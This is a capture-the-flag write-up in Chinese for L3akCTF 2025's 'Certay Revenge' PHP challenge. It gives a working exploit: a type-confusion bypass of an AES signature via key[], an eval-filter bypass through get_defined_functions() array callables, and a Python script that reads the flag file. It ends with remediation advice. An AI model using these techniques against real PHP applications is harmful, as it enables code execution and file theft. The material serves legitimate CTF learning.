# L3akCTF 2025 Certay Revenge Writeup

## 题目简述

`Certay Revenge` 延续了原题的 PHP 7.4 记事网站：用户保存的 note 会在通过签名门槛后交给 `eval`。Revenge 版本扩大了危险函数名单，并使用 `token_get_all` 重建代码，试图同时拦截字符串拼接和变量函数调用。

签名实现中的类型问题仍然存在，而新的 token 检查依旧没有覆盖数组元素作为 callable 的语法。决定性障碍仍是签名退化和间接调用，因此按 Web 归档。

## 解题过程

### 绕过签名门槛

页面在 session key 初始化前执行：

```php
define('yek', $_SESSION['yek']);
```

但真正加密时传入的是变量 `$yek`，而不是常量 `yek`。该变量从未赋值。内层签名还把未定义的 `iv` 当作 IV：

```php
custom_sign($_GET['msg'], $yek, safe_sign($_GET['key']))
```

令查询参数为 `key[]=`，PHP 会把它解析为数组。题目使用 PHP 7.4，数组传给 `openssl_encrypt` 的字符串参数后，内层调用失败并返回假值；外层随即使用空 key 和空 IV 做 AES-256-CBC。结果成为攻击者可预先计算的固定签名。

使用下列三项即可通过严格相等比较：

```text
msg  = cea
hash = mq/1NjPIVqO8vD4dQU+4mg==
key[]=
```

容器构建时替换进 `config.php` 的随机 `KEY` 只供已经失败的内层调用使用，因此不会影响这个结果。

### 分析 Revenge 的 token 检查

新函数 `has_concat_bypass` 做了两类检查：

1. 若 `T_VARIABLE` 后跳过空白和注释后紧跟 `(`，就判定为变量函数调用；
2. 收集 `T_STRING`、字符串字面量和左括号，转为小写后再搜索危险函数名。

这能拦截 `$f(...)` 以及把危险函数名拆成字符串再拼接的常见写法，但下面的语法不使用变量 callable：

```php
get_defined_functions()["internal"][789]("/tmp/flag.txt");
```

token 重建结果只会包含允许的 `get_defined_functions`、字符串 `internal` 和若干左括号，不会出现第 789 项对应的真实函数名。PHP 执行时先从内部函数表取出该名字，再把数组元素直接作为 callable 调用。

第 789 项的位置只对题目给定的 PHP 7.4 镜像及扩展集合成立；其作用是把 `/tmp/flag.txt` 内容输出到当前响应。换 PHP 版本时，内部函数的注册顺序可能变化。

### 利用脚本

```python
import re
import secrets
import requests

base = "http://target"
s = requests.Session()
username = "u" + secrets.token_hex(6)
account = {"username": username, "password": secrets.token_hex(8)}

s.post(base + "/register.php", data=account)
s.post(base + "/login.php", data=account)
s.post(base + "/post_note.php", data={
    "note": 'get_defined_functions()["internal"][789]("/tmp/flag.txt");'
})

response = s.get(base + "/dashboard.php", params=[
    ("msg", "cea"),
    ("hash", "mq/1NjPIVqO8vD4dQU+4mg=="),
    ("key[]", ""),
])

print(re.search(r"L3AK\{.*?\}", response.text).group(0))
```

得到：

```text
L3AK{St0P_R4ad11nG_F1Les_ANdd_L3aaaKK_TH3_S3cr3ts!!!!!!5142542}
```

## 方法总结

Revenge 版本加强了文本过滤，却没有修复真正的执行边界：服务器仍然对用户 note 调用 `eval`。只要 PHP 还支持数组元素、静态方法、反射或其他运行时 callable，枚举若干 token 形态就很难覆盖全部等价语法。

签名部分同样说明，安全检查需要验证每一层调用是否成功及返回类型是否正确。内层失败值被直接当成外层 IV 使用，最终让随机密钥完全退出有效数据流。可靠修复应删除 `eval`、使用明确允许的结构化 note 格式，并对密码 API 的输入类型和错误返回进行强制校验。
